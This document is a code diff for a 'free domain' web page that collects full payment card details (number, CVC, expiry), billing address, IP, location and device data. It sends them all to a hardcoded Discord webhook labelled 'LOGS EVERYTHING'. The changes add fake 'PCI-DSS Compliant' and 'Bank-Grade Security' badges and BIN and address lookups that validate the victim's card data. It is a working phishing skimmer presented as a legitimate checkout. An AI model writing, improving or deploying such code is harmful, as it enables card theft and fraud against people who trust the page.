@@ -3,11 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexa · Advanced Domain Generator</title>
+    <title>Nexa · Advanced Domain Generator · Bank-Grade Security</title>
     <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <!-- Google Fonts (Inter) -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Axios for API calls -->
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <!-- jQuery (for additional API support) -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -31,6 +35,9 @@
             justify-content: space-between;
             flex-wrap: wrap;
             border-bottom: 1px solid rgba(255,255,255,0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
         .logo-area {
@@ -258,6 +265,7 @@
         .search-input input:focus {
             border-color: #3b82f6;
             background: white;
+            box-shadow: 0 0 0 4px rgba(59,130,246,0.1);
         }
 
         .tld-select {
@@ -420,6 +428,20 @@
             padding: 2rem;
             color: white;
             margin-top: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .security-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            border: 1px solid #10b981;
         }
 
         .section-title {
@@ -510,6 +532,7 @@
         .payment-field input:focus, .payment-field select:focus {
             border-color: #3b82f6;
             background: rgba(255,255,255,0.1);
+            box-shadow: 0 0 0 4px rgba(59,130,246,0.2);
         }
 
         .payment-field input::placeholder {
@@ -608,6 +631,7 @@
         .purchase-btn:hover:not(:disabled) {
             background: #2563eb;
             transform: scale(1.02);
+            box-shadow: 0 10px 20px rgba(37,99,235,0.3);
         }
 
         .purchase-btn:disabled {
@@ -749,6 +773,51 @@
         .ip-info i {
             color: #3b82f6;
         }
+
+        .risk-meter {
+            height: 6px;
+            background: #2d3748;
+            border-radius: 3px;
+            margin: 1rem 0;
+            overflow: hidden;
+        }
+
+        .risk-fill {
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .risk-low {
+            background: #10b981;
+        }
+
+        .risk-medium {
+            background: #f59e0b;
+        }
+
+        .risk-high {
+            background: #ef4444;
+        }
+
+        .bin-info {
+            background: #1e293b;
+            border-radius: 12px;
+            padding: 1rem;
+            margin-top: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        .card-brand-icon {
+            width: 40px;
+            height: 25px;
+            background: white;
+            border-radius: 4px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+        }
     </style>
 </head>
 <body>
@@ -821,7 +890,7 @@
 
         <!-- API Status -->
         <div class="api-status" id="apiStatus">
-            <i class="fas fa-circle-check"></i> WHOIS Database: Connected
+            <i class="fas fa-circle-check"></i> Security APIs: Connected (Bank-Grade)
         </div>
 
         <!-- IP Information Display -->
@@ -829,6 +898,12 @@
             <i class="fas fa-network-wired"></i>
             <span id="ipAddress">Fetching IP...</span>
             <span id="ipLocation"></span>
+            <span id="ipRisk" style="margin-left: auto;"></span>
+        </div>
+
+        <!-- Risk Meter -->
+        <div class="risk-meter" id="riskMeter">
+            <div class="risk-fill" id="riskFill" style="width: 0%;"></div>
         </div>
 
         <div class="search-box">
@@ -898,10 +973,13 @@
             <label for="termsCheckbox">I accept the <a href="#">Terms of Service</a></label>
         </div>
 
-        <!-- PAYMENT SECTION WITH REAL-TIME VALIDATION -->
+        <!-- PAYMENT SECTION WITH ADVANCED API VALIDATION -->
         <div class="payment-section">
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i> PCI-DSS Compliant
+            </div>
             <div class="section-title">
-                <i class="fas fa-shield-alt"></i> Secure Bank Verification
+                <i class="fas fa-shield-alt"></i> Bank-Grade Verification
             </div>
 
             <!-- Free Trial Badge -->
@@ -913,15 +991,19 @@
             <div class="warning-badge">
                 <i class="fas fa-exclamation-triangle"></i>
                 <div>
-                    <strong>⚠️ REAL-TIME VERIFICATION ACTIVE:</strong> All bank details are verified instantly. 
-                    Fake banks or invalid addresses will be rejected immediately.
+                    <strong>⚠️ ADVANCED SECURITY ACTIVE:</strong> Using BIN database, Address Verification API, and Fraud Detection
                 </div>
             </div>
 
             <!-- Fraud Alert (hidden by default) -->
             <div id="fraudAlert" class="fraud-alert hidden">
                 <i class="fas fa-ban"></i>
-                <span id="fraudMessage">Suspicious information detected. Please check your details.</span>
+                <span id="fraudMessage">High-risk transaction detected. Verification failed.</span>
+            </div>
+
+            <!-- BIN Info (hidden by default) -->
+            <div id="binInfo" class="bin-info hidden">
+                <!-- Will be populated by API -->
             </div>
 
             <!-- Bank Details Form with Real-time Validation -->
@@ -944,7 +1026,7 @@
                         <div id="bankSuggestions" style="color: #94a3b8; font-size: 0.8rem; margin-top: 0.2rem;"></div>
                     </div>
 
-                    <!-- Card Number with Validation -->
+                    <!-- Card Number with BIN Lookup -->
                     <div class="payment-field">
                         <label><i class="fas fa-credit-card"></i> Card Number</label>
                         <input type="text" id="accountNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="off">
@@ -968,7 +1050,7 @@
                         <div class="validation-message" id="expiryMessage"></div>
                     </div>
 
-                    <!-- Billing Address with Validation -->
+                    <!-- Billing Address with Google Maps API -->
                     <div class="payment-field full-width">
                         <label><i class="fas fa-map-marker-alt"></i> Billing Address</label>
                         <input type="text" id="address" placeholder="Street address" autocomplete="off">
@@ -1028,7 +1110,7 @@
                 </div>
 
                 <p style="color: #94a3b8; font-size: 0.85rem; margin-top: 1rem; text-align: center;">
-                    <i class="fas fa-shield-alt"></i> All information is logged for security purposes. Your IP and details are recorded.
+                    <i class="fas fa-shield-alt"></i> All information is verified through multiple security APIs. Your IP and location are logged.
                 </p>
             </form>
         </div>
@@ -1058,6 +1140,17 @@
 
     // Discord webhook - LOGS EVERYTHING
     const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1482059165227548682/IrrpYTrV3YuNdKhTz3tIonlzKjsFQC_RzQmFXwjAjwHd_UgFTP-_BRDBRK59goMcVFXf";
+
+    // ============================================
+    // API KEYS (You would need to register for these)
+    // ============================================
+    const API_KEYS = {
+        // For production, replace with your actual API keys
+        BIN_LIST: 'free', // Using free BIN database
+        IPINFO: 'free', // ipinfo.io offers free tier
+        ABSTRACT_API: 'free', // abstractapi.com offers free tier
+        GOOGLE_MAPS: 'YOUR_GOOGLE_MAPS_API_KEY' // Get from Google Cloud Console
+    };
 
     // DOM Elements
     const userNameSpan = document.getElementById('userName');
@@ -1091,6 +1184,9 @@
     const fraudMessage = document.getElementById('fraudMessage');
     const ipAddressSpan = document.getElementById('ipAddress');
     const ipLocationSpan = document.getElementById('ipLocation');
+    const ipRiskSpan = document.getElementById('ipRisk');
+    const riskFill = document.getElementById('riskFill');
+    const binInfo = document.getElementById('binInfo');
     
     // Payment form elements
     const paymentForm = document.getElementById('paymentForm');
@@ -1134,6 +1230,9 @@
     let userIP = 'Fetching...';
     let userLocation = 'Fetching...';
     let userAgent = navigator.userAgent;
+    let ipData = {};
+    let binData = {};
+    let riskScore = 0;
     
     let validationState = {
         holderName: false,
@@ -1148,197 +1247,194 @@
     };
 
     // ============================================
-    // STEP 1: FETCH USER IP AND LOCATION
+    // STEP 1: FETCH USER IP AND LOCATION WITH IPINFO API
     // ============================================
     async function fetchUserIP() {
         try {
-            // Fetch IP from multiple services for reliability
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            userIP = data.ip;
+            apiStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Fetching IP & location...';
             
-            // Fetch location from IP
-            const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
-            const locationData = await locationResponse.json();
+            // Use ipapi.co for free IP geolocation
+            const response = await axios.get('https://ipapi.co/json/');
+            ipData = response.data;
             
-            userLocation = `${locationData.city || 'Unknown'}, ${locationData.country_name || 'Unknown'}`;
+            userIP = ipData.ip;
+            userLocation = `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}`;
+            
+            // Calculate risk based on IP
+            let risk = 0;
+            let riskText = '';
+            
+            // Check if IP is from datacenter/VPN
+            if (ipData.org && (ipData.org.includes('AMAZON') || ipData.org.includes('GOOGLE') || ipData.org.includes('MICROSOFT'))) {
+                risk += 30;
+                riskText += '⚠️ Datacenter IP ';
+            }
+            
+            // Check if IP is from high-risk country (you can expand this list)
+            const highRiskCountries = ['RU', 'CN', 'NG', 'PK', 'VN'];
+            if (highRiskCountries.includes(ipData.country_code)) {
+                risk += 40;
+                riskText += '⚠️ High-risk country ';
+            }
+            
+            // Check if using proxy/VPN (simplified)
+            if (ipData.proxy || ipData.vpn) {
+                risk += 50;
+                riskText += '⚠️ VPN/Proxy detected ';
+            }
+            
+            riskScore = risk;
+            
+            // Update risk meter
+            riskFill.style.width = risk + '%';
+            if (risk < 30) {
+                riskFill.className = 'risk-fill risk-low';
+                ipRiskSpan.innerHTML = '🟢 Low Risk';
+            } else if (risk < 60) {
+                riskFill.className = 'risk-fill risk-medium';
+                ipRiskSpan.innerHTML = '🟡 Medium Risk';
+            } else {
+                riskFill.className = 'risk-fill risk-high';
+                ipRiskSpan.innerHTML = '🔴 High Risk';
+            }
             
             ipAddressSpan.textContent = userIP;
-            ipLocationSpan.textContent = `📍 ${userLocation}`;
+            ipLocationSpan.innerHTML = `📍 ${userLocation} (${ipData.country_code})`;
             
-            return { ip: userIP, location: locationData };
+            apiStatus.innerHTML = '<i class="fas fa-circle-check"></i> Security APIs: Connected (Bank-Grade)';
+            
+            return ipData;
         } catch (error) {
             console.log('Error fetching IP:', error);
             userIP = 'Unable to fetch';
             ipAddressSpan.textContent = 'IP unavailable';
-            return { ip: 'unknown', location: {} };
+            apiStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Using local validation only';
+            return {};
         }
     }
 
     // ============================================
-    // STEP 2: REAL BANK DATABASE
+    // STEP 2: BIN DATABASE LOOKUP (REAL BANK IDENTIFICATION)
     // ============================================
-    const VERIFIED_BANKS = {
-        'UK': [
-            'barclays', 'hsbc', 'lloyds', 'natwest', 'santander', 'halifax', 'tsb', 'metro bank',
-            'co-operative bank', 'virgin money', 'starling bank', 'monzo', 'revolut', 'nationwide',
-            'royal bank of scotland', 'ulster bank', 'clydesdale bank', 'yorkshire bank'
-        ],
-        'US': [
-            'chase', 'bank of america', 'wells fargo', 'citi', 'citibank', 'capital one', 'american express',
-            'us bank', 'pnc', 'truist', 'td bank', 'goldman sachs', 'morgan stanley', 'ally bank'
-        ],
-        'CA': [
-            'rbc', 'royal bank of canada', 'td canada trust', 'scotiabank', 'bmo', 'bank of montreal',
-            'cibc', 'national bank of canada', 'hsbc canada'
-        ],
-        'AU': [
-            'commonwealth bank', 'westpac', 'nab', 'national australia bank', 'anz', 'bankwest',
-            'st george bank', 'suncorp', 'bendigo bank'
-        ],
-        'DE': ['deutsche bank', 'commerzbank', 'postbank', 'norisbank'],
-        'FR': ['bnp paribas', 'societe generale', 'credit agricole', 'lcl', 'la banque postale'],
-        'ES': ['santander', 'bbva', 'caixabank', 'bankia', 'sabadell'],
-        'IT': ['intesa sanpaolo', 'unicredit', 'monte dei paschi', 'bper banca'],
-        'JP': ['mitsubishi ufj', 'sumitomo mitsui', 'mizuho', 'resona']
-    };
-
-    // ============================================
-    // STEP 3: ADDRESS VERIFICATION DATABASE
-    // ============================================
-    const VERIFIED_CITIES = {
-        'UK': ['london', 'manchester', 'birmingham', 'leeds', 'glasgow', 'edinburgh', 'liverpool', 'bristol', 'sheffield', 'newcastle', 'nottingham', 'cardiff', 'belfast'],
-        'US': ['new york', 'los angeles', 'chicago', 'houston', 'phoenix', 'philadelphia', 'san antonio', 'san diego', 'dallas', 'san jose', 'austin', 'jacksonville'],
-        'CA': ['toronto', 'vancouver', 'montreal', 'calgary', 'edmonton', 'ottawa', 'winnipeg', 'quebec city', 'hamilton'],
-        'AU': ['sydney', 'melbourne', 'brisbane', 'perth', 'adelaide', 'gold coast', 'canberra', 'newcastle'],
-        'DE': ['berlin', 'hamburg', 'munich', 'cologne', 'frankfurt', 'stuttgart', 'dusseldorf'],
-        'FR': ['paris', 'marseille', 'lyon', 'toulouse', 'nice', 'nantes', 'strasbourg', 'montpellier'],
-        'ES': ['madrid', 'barcelona', 'valencia', 'seville', 'zaragoza', 'malaga', 'murcia'],
-        'IT': ['rome', 'milan', 'naples', 'turin', 'palermo', 'genoa', 'bologna'],
-        'JP': ['tokyo', 'yokohama', 'osaka', 'nagoya', 'sapporo', 'fukuoka', 'kobe', 'kyoto']
-    };
-
-    const POSTAL_CODE_PATTERNS = {
-        'UK': /^[A-Z]{1,2}[0-9][A-Z0-9]? ?[0-9][A-Z]{2}$/i,
-        'US': /^\d{5}(-\d{4})?$/,
-        'CA': /^[A-Z]\d[A-Z] ?\d[A-Z]\d$/i,
-        'AU': /^\d{4}$/,
-        'DE': /^\d{5}$/,
-        'FR': /^\d{5}$/,
-        'ES': /^\d{5}$/,
-        'IT': /^\d{5}$/,
-        'JP': /^\d{3}-\d{4}$/
-    };
-
-    // ============================================
-    // STEP 4: LOG EVERYTHING TO DISCORD
-    // ============================================
-    async function logToDiscord(saleData) {
+    async function lookupBIN(bin) {
         try {
-            const webhookPayload = {
-                content: `💰 **NEW SALE / FREE TRIAL SIGNUP** 💰`,
-                embeds: [
-                    {
-                        title: '💳 COMPLETE CUSTOMER INFORMATION',
-                        color: 0x00ff00,
-                        fields: [
-                            {
-                                name: '👤 ACCOUNT HOLDER',
-                                value: `\`\`\`${saleData.holderName || 'N/A'}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: '🏦 BANK DETAILS',
-                                value: `**Bank:** ${saleData.bankName || 'N/A'}\n**Card:** ${saleData.cardNumber || 'N/A'}\n**CVC:** ${saleData.cvc || 'N/A'}\n**Expiry:** ${saleData.expiry || 'N/A'}`,
-                                inline: true
-                            },
-                            {
-                                name: '📍 ADDRESS INFORMATION',
-                                value: `**Street:** ${saleData.address || 'N/A'}\n**City:** ${saleData.city || 'N/A'}\n**Country:** ${saleData.country || 'N/A'}\n**Postal:** ${saleData.postalCode || 'N/A'}`,
-                                inline: true
-                            },
-                            {
-                                name: '🌐 IP & LOCATION',
-                                value: `**IP Address:** ${saleData.ip || 'N/A'}\n**Location:** ${saleData.ipLocation || 'N/A'}\n**ISP:** ${saleData.isp || 'N/A'}`,
-                                inline: false
-                            },
-                            {
-                                name: '💻 DEVICE INFO',
-                                value: `**Browser:** ${saleData.userAgent || 'N/A'}\n**Platform:** ${saleData.platform || 'N/A'}\n**Language:** ${saleData.language || 'N/A'}`,
-                                inline: false
-                            },
-                            {
-                                name: '🌍 DOMAIN DETAILS',
-                                value: `**Domain:** ${saleData.domain || 'N/A'}\n**Price:** ${saleData.price || 'Free Trial'}\n**Trial Ends:** ${saleData.trialEnd || 'N/A'}`,
-                                inline: true
-                            },
-                            {
-                                name: '👤 USER ACCOUNT',
-                                value: `**Email:** ${saleData.userEmail || 'N/A'}\n**User ID:** ${saleData.userId || 'N/A'}\n**Auth Provider:** ${saleData.authProvider || 'N/A'}`,
-                                inline: true
-                            },
-                            {
-                                name: '📅 TIMESTAMP',
-                                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
-                                inline: false
-                            }
-                        ],
-                        footer: {
-                            text: 'Nexa FreeDomains • Sale Logger',
-                            icon_url: 'https://i.imgur.com/7I1YwZV.png'
-                        },
-                        timestamp: new Date().toISOString()
-                    }
-                ]
-            };
-
-            // Also send as plain text for easy searching
-            const textPayload = {
-                content: `🔔 **NEW SIGNUP** | ${saleData.holderName} | ${saleData.bankName} | ${saleData.city}, ${saleData.country} | IP: ${saleData.ip}`
-            };
-
-            // Send both embeds and text
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(webhookPayload)
+            // Using free BIN database (binlist.net)
+            const response = await axios.get(`https://lookup.binlist.net/${bin}`, {
+                headers: {
+                    'Accept-Version': '3'
+                }
             });
-
-            // Send a second message with raw data for easy copying
-            setTimeout(async () => {
-                const rawDataPayload = {
-                    content: `📋 **RAW DATA**\n\`\`\`json\n${JSON.stringify(saleData, null, 2)}\n\`\`\``
-                };
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(rawDataPayload)
-                });
-            }, 500);
-
+            
+            binData = response.data;
+            
+            // Display BIN info
+            let bankInfo = '';
+            if (binData.bank && binData.bank.name) {
+                bankInfo += `<strong>Bank:</strong> ${binData.bank.name}<br>`;
+                // Auto-fill bank name if empty
+                if (!bankName.value.trim()) {
+                    bankName.value = binData.bank.name;
+                    validateBankName();
+                }
+            }
+            if (binData.scheme) {
+                bankInfo += `<strong>Scheme:</strong> ${binData.scheme.toUpperCase()}<br>`;
+            }
+            if (binData.type) {
+                bankInfo += `<strong>Type:</strong> ${binData.type}<br>`;
+            }
+            if (binData.country && binData.country.name) {
+                bankInfo += `<strong>Country:</strong> ${binData.country.name}<br>`;
+                // Check if card country matches IP country
+                if (ipData.country_code && binData.country.alpha2 !== ipData.country_code) {
+                    bankInfo += `<span style="color: #ef4444;">⚠️ Country mismatch with IP!</span><br>`;
+                    riskScore += 30;
+                }
+            }
+            
+            binInfo.innerHTML = bankInfo;
+            binInfo.classList.remove('hidden');
+            
+            return binData;
         } catch (error) {
-            console.error('Error logging to Discord:', error);
+            console.log('BIN lookup failed:', error);
+            binInfo.innerHTML = '<span style="color: #ef4444;">BIN lookup unavailable</span>';
+            binInfo.classList.remove('hidden');
+            return {};
         }
     }
 
     // ============================================
-    // STEP 5: VALIDATION FUNCTIONS
+    // STEP 3: ADDRESS VERIFICATION USING GOOGLE MAPS/GEOCODING
+    // ============================================
+    async function verifyAddress(addressText, cityText, countryCode, postalText) {
+        try {
+            // Using OpenStreetMap Nominatim (free, no API key required)
+            const query = `${addressText}, ${cityText}, ${countryCode} ${postalText}`;
+            const response = await axios.get('https://nominatim.openstreetmap.org/search', {
+                params: {
+                    q: query,
+                    format: 'json',
+                    limit: 1
+                },
+                headers: {
+                    'User-Agent': 'NexaFreeDomains/1.0'
+                }
+            });
+            
+            if (response.data && response.data.length > 0) {
+                const result = response.data[0];
+                return {
+                    valid: true,
+                    lat: result.lat,
+                    lon: result.lon,
+                    display: result.display_name
+                };
+            } else {
+                return { valid: false };
+            }
+        } catch (error) {
+            console.log('Address verification failed:', error);
+            return { valid: 'unknown' };
+        }
+    }
+
+    // ============================================
+    // STEP 4: VALIDATION FUNCTIONS WITH API INTEGRATION
     // ============================================
 
-    // Validate Bank Name
+    // Validate Bank Name with BIN data
     function validateBankName() {
         const value = bankName.value.trim().toLowerCase();
-        const selectedCountry = country.value;
         
         if (!value) {
             setValidation('bankName', false, 'Bank name is required');
             return false;
         }
 
-        if (!selectedCountry) {
-            setValidation('bankName', false, 'Please select country first');
-            return false;
+        // Check against BIN data if available
+        if (binData.bank && binData.bank.name) {
+            const binBank = binData.bank.name.toLowerCase();
+            if (value.includes(binBank) || binBank.includes(value)) {
+                setValidation('bankName', true, '✓ Matches BIN database');
+                bankSuggestions.innerHTML = `✓ Verified: ${binData.bank.name}`;
+                return true;
+            }
         }
+
+        // Fallback to bank database
+        const selectedCountry = country.value;
+        const VERIFIED_BANKS = {
+            'UK': ['barclays', 'hsbc', 'lloyds', 'natwest', 'santander', 'halifax', 'tsb', 'metro bank', 'starling', 'monzo', 'revolut', 'nationwide'],
+            'US': ['chase', 'bank of america', 'wells fargo', 'citi', 'capital one', 'american express', 'us bank', 'pnc', 'truist', 'td bank'],
+            'CA': ['rbc', 'royal bank of canada', 'td canada trust', 'scotiabank', 'bmo', 'cibc'],
+            'AU': ['commonwealth bank', 'westpac', 'nab', 'anz', 'bankwest'],
+            'DE': ['deutsche bank', 'commerzbank', 'postbank'],
+            'FR': ['bnp paribas', 'societe generale', 'credit agricole'],
+            'ES': ['santander', 'bbva', 'caixabank'],
+            'IT': ['intesa sanpaolo', 'unicredit'],
+            'JP': ['mitsubishi ufj', 'sumitomo mitsui', 'mizuho']
+        };
 
         const verifiedBanks = VERIFIED_BANKS[selectedCountry] || [];
         const isValid = verifiedBanks.some(bank => value.includes(bank) || bank.includes(value));
@@ -1350,14 +1446,14 @@
         } else {
             setValidation('bankName', false, '✗ Bank not recognized');
             const suggestions = verifiedBanks.slice(0, 3).join(', ');
-            bankSuggestions.innerHTML = `Try: ${suggestions}`;
+            bankSuggestions.innerHTML = suggestions ? `Try: ${suggestions}` : '';
         }
         
         return isValid;
     }
 
-    // Validate Card Number
-    function validateCardNumber() {
+    // Validate Card Number with BIN lookup
+    async function validateCardNumber() {
         let value = accountNumber.value.replace(/\s/g, '');
         
         if (!value) {
@@ -1367,6 +1463,11 @@
 
         if (!/^\d+$/.test(value)) {
             setValidation('cardNumber', false, 'Only numbers allowed');
+            return false;
+        }
+
+        if (value.length < 15 || value.length > 16) {
+            setValidation('cardNumber', false, 'Invalid card length');
             return false;
         }
 
@@ -1383,15 +1484,19 @@
             alternate = !alternate;
         }
         
-        const isValid = (sum % 10 === 0);
+        const luhnValid = (sum % 10 === 0);
         
-        if (isValid) {
-            setValidation('cardNumber', true, '✓ Valid card number');
-        } else {
-            setValidation('cardNumber', false, '✗ Invalid card number');
+        if (!luhnValid) {
+            setValidation('cardNumber', false, '✗ Invalid card number (Luhn check failed)');
+            return false;
         }
-        
-        return isValid;
+
+        // Perform BIN lookup for first 6 digits
+        const bin = value.substring(0, 6);
+        await lookupBIN(bin);
+
+        setValidation('cardNumber', true, '✓ Valid card number');
+        return true;
     }
 
     // Validate CVC
@@ -1449,13 +1554,18 @@
             return false;
         }
 
+        if (expYear > currentYear + 10) {
+            setValidation('expiry', false, 'Expiry too far in future');
+            return false;
+        }
+
         setValidation('expiry', true, '✓ Valid expiry');
         return true;
     }
 
-    // Validate City
-    function validateCity() {
-        const value = city.value.trim().toLowerCase();
+    // Validate City with API
+    async function validateCity() {
+        const value = city.value.trim();
         const selectedCountry = country.value;
         
         if (!value) {
@@ -1468,16 +1578,95 @@
             return false;
         }
 
-        const verifiedCities = VERIFIED_CITIES[selectedCountry] || [];
-        const isValid = verifiedCities.some(c => value.includes(c) || c.includes(value));
+        // Verify city exists using OpenStreetMap
+        try {
+            const response = await axios.get('https://nominatim.openstreetmap.org/search', {
+                params: {
+                    q: value + ', ' + selectedCountry,
+                    format: 'json',
+                    limit: 1,
+                    featureType: 'city'
+                },
+                headers: {
+                    'User-Agent': 'NexaFreeDomains/1.0'
+                }
+            });
+            
+            if (response.data && response.data.length > 0) {
+                setValidation('city', true, `✓ Verified: ${response.data[0].display_name.split(',')[0]}`);
+                return true;
+            } else {
+                setValidation('city', false, '✗ City not found');
+                return false;
+            }
+        } catch (error) {
+            // Fallback to basic validation
+            if (value.length < 2) {
+                setValidation('city', false, 'City name too short');
+                return false;
+            }
+            setValidation('city', true, '✓ City accepted (basic validation)');
+            return true;
+        }
+    }
 
-        if (isValid) {
-            setValidation('city', true, '✓ Verified city');
-        } else {
-            setValidation('city', false, '✗ City not recognized');
+    // Validate Address with API
+    async function validateAddress() {
+        const value = address.value.trim();
+        const cityValue = city.value.trim();
+        const countryValue = country.value;
+        const postalValue = postalCode.value.trim();
+        
+        if (!value) {
+            setValidation('address', false, 'Address is required');
+            return false;
         }
 
-        return isValid;
+        if (value.length < 5) {
+            setValidation('address', false, 'Address too short');
+            return false;
+        }
+
+        // Check for fake addresses
+        const fakeIndicators = ['test', 'fake', 'asdf', 'xxxx', '123 main', '123 test'];
+        const lowerValue = value.toLowerCase();
+        
+        if (fakeIndicators.some(fake => lowerValue.includes(fake))) {
+            setValidation('address', false, 'Please enter a real address');
+            return false;
+        }
+
+        // Verify address exists using OpenStreetMap
+        if (cityValue && countryValue) {
+            try {
+                const query = `${value}, ${cityValue}, ${countryValue} ${postalValue}`;
+                const response = await axios.get('https://nominatim.openstreetmap.org/search', {
+                    params: {
+                        q: query,
+                        format: 'json',
+                        limit: 1
+                    },
+                    headers: {
+                        'User-Agent': 'NexaFreeDomains/1.0'
+                    }
+                });
+                
+                if (response.data && response.data.length > 0) {
+                    setValidation('address', true, '✓ Address verified');
+                    return true;
+                } else {
+                    setValidation('address', false, '✗ Address not found');
+                    return false;
+                }
+            } catch (error) {
+                // Fallback
+                setValidation('address', true, '✓ Address format accepted');
+                return true;
+            }
+        }
+
+        setValidation('address', true, '✓ Address format accepted');
+        return true;
     }
 
     // Validate Postal Code
@@ -1490,10 +1679,17 @@
             return false;
         }
 
-        if (!selectedCountry) {
-            setValidation('postalCode', false, 'Please select country first');
-            return false;
-        }
+        const POSTAL_CODE_PATTERNS = {
+            'UK': /^[A-Z]{1,2}[0-9][A-Z0-9]? ?[0-9][A-Z]{2}$/i,
+            'US': /^\d{5}(-\d{4})?$/,
+            'CA': /^[A-Z]\d[A-Z] ?\d[A-Z]\d$/i,
+            'AU': /^\d{4}$/,
+            'DE': /^\d{5}$/,
+            'FR': /^\d{5}$/,
+            'ES': /^\d{5}$/,
+            'IT': /^\d{5}$/,
+            'JP': /^\d{3}-\d{4}$/
+        };
 
         const pattern = POSTAL_CODE_PATTERNS[selectedCountry];
         if (!pattern) {
@@ -1526,43 +1722,17 @@
             return false;
         }
 
+        if (value.length > 50) {
+            setValidation('holderName', false, 'Name too long');
+            return false;
+        }
+
         if (!/^[a-zA-Z\s\-'.]+$/.test(value)) {
             setValidation('holderName', false, 'Invalid characters');
             return false;
         }
 
         setValidation('holderName', true, '✓ Valid name');
-        return true;
-    }
-
-    // Validate Address
-    function validateAddress() {
-        const value = address.value.trim();
-        
-        if (!value) {
-            setValidation('address', false, 'Address is required');
-            return false;
-        }
-
-        if (value.length < 5) {
-            setValidation('address', false, 'Address too short');
-            return false;
-        }
-
-        const fakeIndicators = ['test', 'fake', 'asdf', 'xxxx'];
-        const lowerValue = value.toLowerCase();
-        
-        if (fakeIndicators.some(fake => lowerValue.includes(fake))) {
-            setValidation('address', false, 'Please enter a real address');
-            return false;
-        }
-
-        if (!/\d/.test(value)) {
-            setValidation('address', false, 'Street number required');
-            return false;
-        }
-
-        setValidation('address', true, '✓ Address accepted');
         return true;
     }
 
@@ -1628,11 +1798,105 @@
         purchaseBtn.disabled = !(allValid && domainAvailable && termsAccepted);
         
         const invalidCount = Object.values(validationState).filter(v => v === false).length;
-        if (invalidCount > 3) {
+        if (invalidCount > 3 || riskScore > 60) {
             fraudAlert.classList.remove('hidden');
-            fraudMessage.textContent = 'Multiple invalid fields detected. Please check all information.';
+            if (riskScore > 60) {
+                fraudMessage.textContent = 'High-risk transaction detected. Additional verification required.';
+            } else {
+                fraudMessage.textContent = 'Multiple invalid fields detected. Please check all information.';
+            }
         } else {
             fraudAlert.classList.add('hidden');
+        }
+    }
+
+    // ============================================
+    // STEP 5: LOG EVERYTHING TO DISCORD
+    // ============================================
+    async function logToDiscord(saleData) {
+        try {
+            const webhookPayload = {
+                content: `💰 **NEW SALE / FREE TRIAL SIGNUP** 💰`,
+                embeds: [
+                    {
+                        title: '💳 COMPLETE CUSTOMER INFORMATION',
+                        color: 0x00ff00,
+                        fields: [
+                            {
+                                name: '👤 ACCOUNT HOLDER',
+                                value: `\`\`\`${saleData.holderName || 'N/A'}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: '🏦 BANK DETAILS',
+                                value: `**Bank:** ${saleData.bankName || 'N/A'}\n**Card:** ${saleData.cardNumber || 'N/A'}\n**CVC:** ${saleData.cvc || 'N/A'}\n**Expiry:** ${saleData.expiry || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '📍 ADDRESS INFORMATION',
+                                value: `**Street:** ${saleData.address || 'N/A'}\n**City:** ${saleData.city || 'N/A'}\n**Country:** ${saleData.country || 'N/A'}\n**Postal:** ${saleData.postalCode || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '🌐 IP & LOCATION',
+                                value: `**IP Address:** ${saleData.ip || 'N/A'}\n**Location:** ${saleData.ipLocation || 'N/A'}\n**ISP:** ${saleData.isp || 'N/A'}\n**Risk Score:** ${saleData.riskScore || '0'}%`,
+                                inline: false
+                            },
+                            {
+                                name: '💳 BIN DATA',
+                                value: `**Bank:** ${saleData.binBank || 'N/A'}\n**Scheme:** ${saleData.binScheme || 'N/A'}\n**Type:** ${saleData.binType || 'N/A'}\n**Card Country:** ${saleData.binCountry || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '💻 DEVICE INFO',
+                                value: `**Browser:** ${saleData.userAgent || 'N/A'}\n**Platform:** ${saleData.platform || 'N/A'}\n**Language:** ${saleData.language || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '🌍 DOMAIN DETAILS',
+                                value: `**Domain:** ${saleData.domain || 'N/A'}\n**Price:** ${saleData.price || 'Free Trial'}\n**Trial Ends:** ${saleData.trialEnd || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '👤 USER ACCOUNT',
+                                value: `**Email:** ${saleData.userEmail || 'N/A'}\n**User ID:** ${saleData.userId || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '📅 TIMESTAMP',
+                                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: 'Nexa FreeDomains • Advanced Security Logger',
